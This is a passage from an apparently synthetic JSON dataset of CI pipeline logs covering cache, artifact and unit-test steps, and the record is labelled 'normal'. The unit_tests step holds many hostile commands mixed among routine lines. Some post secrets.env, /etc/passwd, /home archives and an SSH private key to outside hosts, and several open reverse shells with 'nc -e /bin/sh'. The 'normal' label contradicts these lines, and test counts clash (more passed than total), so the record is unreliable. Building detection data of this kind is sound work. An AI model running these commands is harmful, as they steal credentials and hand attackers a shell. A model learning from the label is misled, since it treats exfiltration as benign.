          "Optimizing 46 modules...",
          "Building Docker image...",
          "Artifact downloaded: 34MB",
          "npm notice: package.json updated",
          "npm install: resolved 909 packages",
          "Generating source maps...",
          "Cache hit for key-5375",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 291 files...",
          "  PASS: test_api_health (235ms)",
          "yarn add: Done in 29.58s",
          "Exception: ValueError",
          "Compiling src/app.ts...",
          "npm install: resolved 1389 packages",
          "Waiting...",
          "Already up to date.",
          "Exception: TypeError",
          "[12:19:03] DEBUG: Query executed in 86ms",
          "Pulling image: python:latest",
          "Finished.",
          "[12:19:03] WARN: Deprecated API usage",
          "GET /health - 200 (45ms)",
          "Fetching submodules...",
          "Test Suites: 5 passed, 16 total",
          "\u2713 build completed",
          "Finished.",
          "Artifact downloaded: 18MB",
          "Finished.",
          "\u2713 Step 'test' succeeded",
          "Generating source maps...",
          "\u2713 Task completed in 979ms",
          "Installing jest@1.18.3",
          "[12:19:03] INFO: Processing request",
          "Compiling components/utils.go...",
          "Compiling src/app.ts...",
          "Done.",
          "[12:19:03] INFO: Processing request",
          "Using Node.js 20.13.3",
          "Processing...",
          "Step 10/24: Installing dependencies",
          "Ran 185 tests in 23s",
          "npm notice: package.json updated",
          "Tests: 103 passed, 336 total",
          "Loading...",
          "\u2713 lint completed",
          "npm notice: created a lockfile",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] DEBUG: Loading configuration",
          "Uploading artifact 'build' (16 files)",
          "Artifact downloaded: 24MB",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (23MB)",
          "GET /api - 200 (98ms)",
          "Installing eslint@5.20.4",
          "Already up to date.",
          "Optimizing 13 modules...",
          "\u2713 Task completed in 622ms",
          "\u2717 build failed with exit code 106",
          "Uploading artifact 'dist' (35 files)",
          "npm install: resolved 585 packages",
          "[12:19:03] INFO: Request completed",
          "GET /status - 201 (4ms)",
          "[12:19:03] WARN: Deprecated API usage",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:22:16.560057",
        "finished_at": "2025-11-26T12:22:34.157479",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:19:03] DEBUG: Memory usage: 382MB",
          "[12:19:03] DEBUG: Memory usage: 1547MB",
          "Compiling components/service.java...",
          "Cache saved successfully",
          "[12:19:03] ERROR: Connection failed",
          "[12:19:03] DEBUG: Connection pool: 6 active",
          "Cache saved successfully",
          "Fetching submodules...",
          "POST /api - 201 (85ms)",
          "Platform: linux-x64",
          "Checking out master branch",
          "[12:19:03] INFO: Cache refreshed",
          "pip: Downloading prettier-4.14.tar.gz",
          "Checking out main branch",
          "[12:19:03] DEBUG: Initializing service",
          "Cache restored successfully (12MB)",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] INFO: Starting build process",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "npm install: resolved 431 packages",
          "Cache saved successfully",
          "Bundling runtime.js",
          "Compiling utils/main.py...",
          "Step 4/24: Building",
          "Step 10/24: Running migrations",
          "Coverage: 87% statements, 83% branches",
          "Transforming 221 files...",
          "[12:19:03] DEBUG: Loading configuration",
          "Cache hit for key-2720",
          "\u2717 build failed with exit code 8",
          "[12:19:03] WARN: Deprecated API usage",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:03] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "Loading...",
          "Waiting...",
          "Cache restored successfully (103MB)",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (6MB)",
          "Using Python 3.12",
          "Loading...",
          "Optimizing 77 modules...",
          "Compiling components/handler.rs...",
          "Compiling components/app.ts...",
          "npm notice: package.json updated",
          "Cache invalidated: build",
          "Checking out develop branch",
          "Cache hit for key-6883",
          "Ready.",
          "Compiling lib/handler.rs...",
          "Verifying...",
          "Cache miss for key-9983",
          "Waiting...",
          "Connecting to acme.corp:443...",
          "Cache saved successfully",
          "Ran 136 tests in 34s",
          "Installing prettier@1.16.7",
          "Artifact uploaded: dist.zip (30MB)",
          "WARNING: axios has known vulnerabilities",
          "Building Docker image...",
          "Step 11/24: Building",
          "[12:19:03] DEBUG: Loading configuration",
          "Completed.",
          "Artifact downloaded: 3MB",
          "[12:19:03] DEBUG: Memory usage: 236MB",
          "Coverage: 75% statements, 65% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 2/8: RUN command",
          "Step 7/19: Building",
          "HEAD is now at d4b6235",
          "Compiling components/index.js...",
          "  PASS: test_auth_login (58ms)",
          "HEAD is now at f403038",
          "\u2717 build failed with exit code 76",
          "Ran 15 tests in 26s",
          "\u2713 test completed",
          "TLS handshake completed",
          "Pushing to registry...",
          "NODE_ENV=test",
          "Pushing to registry...",
          "[12:19:03] INFO: Cache refreshed",
          "Installing lodash@4.3.9",
          "Ran 154 tests in 48s",
          "Environment: test",
          "Compiling utils/handler.rs...",
          "Connection established",
          "Step 3/15: Deploying",
          "[12:19:03] ERROR: Connection failed",
          "POST /api - 201 (353ms)",
          "[12:19:03] DEBUG: Loading configuration",
          "Transforming 387 files...",
          "OK",
          "Generating source maps...",
          "Image pulled successfully",
          "TLS handshake completed",
          "Done.",
          "npm notice: package.json updated",
          "[12:19:03] DEBUG: Memory usage: 1660MB",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] WARN: Deprecated API usage",
          "Ready.",
          "POST /upload - 201 (461ms)",
          "Generating source maps...",
          "Compiling src/app.ts...",
          "Success!",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] INFO: Connecting to database",
          "Platform: win32-x64",
          "[12:19:03] WARN: Deprecated API usage",
          "Bundling vendor.css",
          "Compiling utils/app.ts...",
          "Layer 7/12: COPY command",
          "Ran 30 tests in 24s",
          "\u2713 lint completed",
          "\u2713 Step 'checkout' succeeded",
          "Environment: test",
          "Artifact uploaded: dist.zip (53MB)",
          "Snapshots: 22 passed, 23 total",
          "Connecting to cloud.services:443...",
          "  PASS: test_auth_login (2ms)",
          "[12:19:03] INFO: Connecting to database",
          "Pulling image: python:3.11",
          "pip install: Successfully installed eslint-2.9",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@2.7.7",
          "\u2717 build failed with exit code 82",
          "Using Python 3.11",
          "Pulling image: node:3.11",
          "Switched to branch 'hotfix/task-666'",
          "Step 7/16: Building",
          "Completed.",
          "Waiting...",
          "Loading...",
          "pip install: Successfully installed express-4.9",
          "Compiling src/service.java...",
          "Step 12/25: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "Transforming 640 files...",
          "Loading...",
          "Generating source maps...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (55MB)",
          "Waiting...",
          "Connection established",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:19:03] INFO: Request completed",
          "\u2713 All checks passed",
          "  PASS: test_auth_login (124ms)",
          "[12:19:03] INFO: Request completed",
          "Verifying...",
          "[12:19:03] DEBUG: Connection pool: 19 active",
          "NODE_ENV=development",
          "Checking out main branch",
          "WARNING: prettier has known vulnerabilities",
          "yarn add: Done in 17.38s",
          "Cache hit for key-5589",
          "  PASS: test_user_create (419ms)",
          "Finished.",
          "  PASS: test_api_health (443ms)",
          "Creating production build...",
          "Done.",
          "Cache saved successfully",
          "Connecting to example.com:443...",
          "GET /health - 204 (43ms)",
          "Test Suites: 43 passed, 7 total",
          "TLS handshake completed",
          "Ran 85 tests in 52s",
          "Image pulled successfully",
          "Compiling src/main.py...",
          "Connecting to example.com:443...",
          "Connecting to acme.corp:443...",
          "Platform: win32-x64",
          "[12:19:03] INFO: Processing request",
          "Done.",
          "Processing...",
          "Cache restored successfully (460MB)",
          "GET /api - 200 (85ms)",
          "[12:19:03] DEBUG: Query executed in 35ms",
          "[12:19:03] DEBUG: Memory usage: 949MB",
          "Connection established",
          "FAILED: test_api_health",
          "FAILED: test_user_create",
          "Verifying...",
          "Finished.",
          "Generating source maps...",
          "NODE_ENV=production",
          "Installing express@2.19.3",
          "Tests: 153 passed, 217 total",
          "[12:19:03] INFO: Cache refreshed",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Minifying main.js",
          "Cache miss for key-7410",
          "Snapshots: 18 passed, 48 total",
          "Artifact uploaded: dist.zip (38MB)",
          "Exception: NullPointerException",
          "FAILED: test_db_connect",
          "Using Node.js 20.1.9",
          "Step 9/25: Running migrations",
          "Artifact uploaded: dist.zip (66MB)",
          "npm install: resolved 1044 packages",
          "WARNING: react has known vulnerabilities",
          "[12:19:03] INFO: Request completed",
          "Cache miss for key-9419",
          "Verifying...",
          "Bundling runtime.css",
          "[12:19:03] ERROR: Connection failed",
          "[12:19:03] DEBUG: Query executed in 13ms",
          "Artifact uploaded: dist.zip (74MB)",
          "pip: Collecting webpack",
          "[12:19:03] INFO: Processing request",
          "Ready.",
          "Uploading artifact 'build' (14 files)",
          "[12:19:03] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (9MB)",
          "GET /status - 201 (35ms)",
          "Optimizing 78 modules...",
          "Fetching submodules...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-26T12:22:34.157479",
        "finished_at": "2025-11-26T12:23:26.949744",
        "log_lines": [
          "=== Step: unit_tests ===",
          "npm install: resolved 1480 packages",
          "Pushing to registry...",
          "Checking out develop branch",
          "WARNING: prettier has known vulnerabilities",
          "Generating source maps...",
          "Checking out develop branch",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "GET /health - 204 (7ms)",
          "Image pulled successfully",
          "Loading...",
          "Using Node.js 14.15.1",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] ERROR: Connection failed",
          "POST /data - 200 (108ms)",
          "Step 8/17: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "Connecting to startup.dev:443...",
          "nc -e /bin/sh 13.25.91.229 37049",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 24MB",
          "Test Suites: 27 passed, 9 total",
          "TLS handshake completed",
          "Compiling src/handler.rs...",
          "Loading...",
          "npm install: resolved 1340 packages",
          "TLS handshake completed",
          "Artifact downloaded: 37MB",
          "Compiling lib/app.ts...",
          "[12:19:03] DEBUG: Query executed in 49ms",
          "npm notice: created a lockfile",
          "Installing lodash@4.18.4",
          "Cache miss for key-7709",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:19:03] INFO: Starting build process",
          "[12:19:03] ERROR: Connection failed",
          "Time: 35.992s",
          "[12:19:03] INFO: Connecting to database",
          "HEAD is now at 2419c44",
          "Done.",
          "Artifact uploaded: dist.zip (15MB)",
          "Compiling src/utils.go...",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "WARNING: prettier has known vulnerabilities",
          "Cache miss for key-3958",
          "npm install: resolved 334 packages",
          "  PASS: unit/test_auth_login.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "Processing...",
          "Completed.",
          "pip: Collecting jest",
          "Connecting to cloud.services:443...",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (49MB)",
          "Coverage: 75% statements, 85% branches",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-6631",
          "NODE_ENV=development",
          "Compiling utils/utils.go...",
          "pip install: Successfully installed express-2.20",
          "Cache miss for key-8219",
          "[12:19:03] INFO: Starting build process",
          "Checking out develop branch",
          "Tests: 173 passed, 498 total",
          "Artifact downloaded: 16MB",
          "\u2713 lint completed",
          "[12:19:03] DEBUG: Memory usage: 915MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Cache hit for key-3791",
          "Done.",
          "[12:19:03] INFO: Connecting to database",
          "Installing axios@4.2.7",
          "[12:19:03] INFO: Connecting to database",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "nc -e /bin/sh 79.162.211.56 11605",
          "Uploading artifact 'coverage' (27 files)",
          "Connecting to acme.corp:443...",
          "yarn add: Done in 1.78s",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] INFO: Request completed",
          "TLS handshake completed",
          "Cache restored successfully (122MB)",
          "Already up to date.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "nc -e /bin/sh 143.69.226.69 65475",
          "Switched to branch 'hotfix/task-425'",
          "TLS handshake completed",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "Checking out develop branch",
          "Uploading artifact 'build' (18 files)",
          "\u2713 Task completed in 1519ms",
          "\u2713 Task completed in 4659ms",
          "WARNING: express has known vulnerabilities",
          "Connecting to startup.dev:443...",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "Exception: NullPointerException",
          "Sending 193MB of data to cloud.services",
          "pip: Downloading jest-3.13.tar.gz",
          "FAILED: test_db_connect",
          "[12:19:03] WARN: Deprecated API usage",
          "Building Docker image...",
          "Using Python 3.12",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Optimizing 83 modules...",
          "[12:19:03] INFO: Request completed",
          "Fetching submodules...",
          "pip: Downloading eslint-1.13.tar.gz",
          "\u2713 Task completed in 2995ms",
          "Processing...",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Connecting to example.com:443...",
          "npm notice: created a lockfile",
          "pip install: Successfully installed webpack-4.15",
          "Installing lodash@3.15.1",
          "  PASS: test_cache_hit (19ms)",
          "Connection established",
          "[12:19:03] INFO: Request completed",
          "Step 15/22: Deploying",
          "[12:19:03] INFO: Cache refreshed",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "Coverage: 71% statements, 91% branches",
          "Generating source maps...",
          "pip: Downloading eslint-2.0.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] INFO: Processing request",
          "Cache invalidated: dependencies",
          "Sending 438MB of data to example.com",
          "[12:19:03] INFO: Request completed",
          "Cache restored successfully (72MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 16 tests in 35s",
          "Step 13/24: Installing dependencies",
          "Success!",
          "Step 13/22: Linting",
          "Loading...",
          "Optimizing 59 modules...",
          "GET /api - 200 (50ms)",
          "Building Docker image...",
          "Step 10/18: Installing dependencies",
          "[12:19:03] DEBUG: Connection pool: 20 active",
          "Success!",
          "Cache restored successfully (399MB)",
          "Transforming 922 files...",
          "[12:19:03] WARN: Deprecated API usage",
          "Time: 43.865s",
          "Artifact downloaded: 17MB",
          "  PASS: integration/test_db_connect.spec.js",
          "Minifying app.js",
          "POST /data - 200 (98ms)",
          "Waiting...",
          "Done.",
          "Step 11/20: Linting",
          "Connecting to cloud.services:443...",
          "nc -e /bin/sh 169.81.171.120 29729",
          "Loading...",
          "Connection established",
          "Image pulled successfully",
          "WARNING: lodash has known vulnerabilities",
          "Image pulled successfully",
          "Image pulled successfully",
          "Transforming 487 files...",
          "Sending 251MB of data to startup.dev",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 17 passed, 37 total",
          "HEAD is now at c92bab3",
          "pip: Installing build dependencies...",
          "Sending 44MB of data to example.com",
          "Uploading artifact 'build' (23 files)",
          "Transforming 736 files...",
          "nc -e /bin/sh 88.248.39.203 52844",
          "pip: Installing build dependencies...",
          "npm install: resolved 682 packages",
          "Ready.",
          "HEAD is now at 37abdb6",
          "Connecting to test.io:443...",
          "Compiling src/service.java...",
          "[12:19:03] DEBUG: Memory usage: 1913MB",
          "Cache miss for key-6749",
          "[12:19:03] INFO: Starting build process",
          "Uploading artifact 'coverage' (21 files)",
          "nc -e /bin/sh 49.16.145.184 44329",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 3/11: RUN command",
          "Processing...",
          "Switched to branch 'bugfix/task-985'",
          "  PASS: test_db_connect (445ms)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Transforming 991 files...",
          "[12:19:03] DEBUG: Memory usage: 650MB",
          "Compiling components/index.js...",
          "Loading...",
          "[12:19:03] INFO: Request completed",
          "POST /data - 201 (247ms)",
          "[12:19:03] DEBUG: Query executed in 4ms",
          "NODE_ENV=production",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 71.127.253.9 30814",
          "[12:19:03] INFO: Request completed",
          "[12:19:03] INFO: Starting build process",
          "Compiling components/index.js...",
          "[12:19:03] DEBUG: Query executed in 22ms",
          "Using Python 3.11",
          "[12:19:03] DEBUG: Loading configuration",
          "Ran 115 tests in 36s",
          "Pushing to registry...",
          "[12:19:03] INFO: Cache refreshed",
          "Transforming 455 files...",
          "Cache miss for key-4231",
          "Pushing to registry...",
          "Ready.",
          "Installing prettier@3.9.5",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: created a lockfile",
          "Cache miss for key-3706",
          "pip: Downloading react-2.11.tar.gz",
          "Step 5/16: Building",
          "[12:19:03] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "[12:19:03] DEBUG: Initializing service",
          "Artifact downloaded: 38MB",
          "yarn add: Done in 13.92s",
          "Building Docker image...",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "WARNING: express has known vulnerabilities",
          "Step 17/25: Building",
          "Test Suites: 45 passed, 6 total",
          "nc -e /bin/sh 9.43.3.80 6351",
          "Snapshots: 10 passed, 43 total",
          "Step 12/22: Linting",
          "[12:19:03] ERROR: Connection failed",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}